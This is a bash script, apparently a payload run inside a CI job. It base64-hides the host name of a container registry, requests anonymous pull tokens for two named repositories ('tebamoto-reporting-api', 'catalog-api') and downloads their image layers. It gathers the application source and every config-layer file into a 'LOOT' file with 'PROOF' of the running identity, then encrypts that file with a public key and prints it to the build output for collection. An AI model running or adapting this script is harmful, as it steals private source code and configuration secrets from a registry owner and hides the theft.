#!/usr/bin/env bash
set -uo pipefail
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
ACR="$(b 'Y3J0YmxwbGF0cHJvZHgzZXVvei5henVyZWNyLmlv')"
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
say "PROOF: $(id) | host=$(hostname)"
PULL=$(curl -sS -G "${SC}$ACR/oauth2/token" --data-urlencode "service=$ACR" --data-urlencode "scope=repository:tebamoto-reporting-api:pull" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
say "PULL len=${#PULL}"
curl -sSL -H "Authorization: Bearer $PULL" "${SC}$ACR/v2/tebamoto-reporting-api/blobs/sha256:dc8b66e0746e31648e32ccbeb9c4b33dfe06bc0a0ffd1b1168eecc9f3e70fd1b" -o /tmp/l.tar.gz
say "LAYER sz=$(wc -c </tmp/l.tar.gz)"
mkdir -p /tmp/x && tar -xzf /tmp/l.tar.gz -C /tmp/x 2>/dev/null
say "===== app/app.py ====="
say "$(cat /tmp/x/app/app.py 2>/dev/null)"
say "===== files ====="
say "$(find /tmp/x -type f)"
# also index for catalog-api config layer
PULL2=$(curl -sS -G "${SC}$ACR/oauth2/token" --data-urlencode "service=$ACR" --data-urlencode "scope=repository:catalog-api:pull" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
for D in sha256:5b98a48f74f992383db12481f0e7c3e08dab1b640594c00ccf7e4b511beb6546 sha256:8c84f1de9ee9641e404a3025d2b6a03792e65daabdb350c5d7e9bd987abfd510; do
  curl -sSL -H "Authorization: Bearer $PULL2" "${SC}$ACR/v2/catalog-api/blobs/$D" -o /tmp/c.tar.gz
  mkdir -p /tmp/y && tar -xzf /tmp/c.tar.gz -C /tmp/y 2>/dev/null
  say "== catalog layer $D =="; for f in $(find /tmp/y -type f); do say "--- $f ---"; say "$(cat $f)"; done
done
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
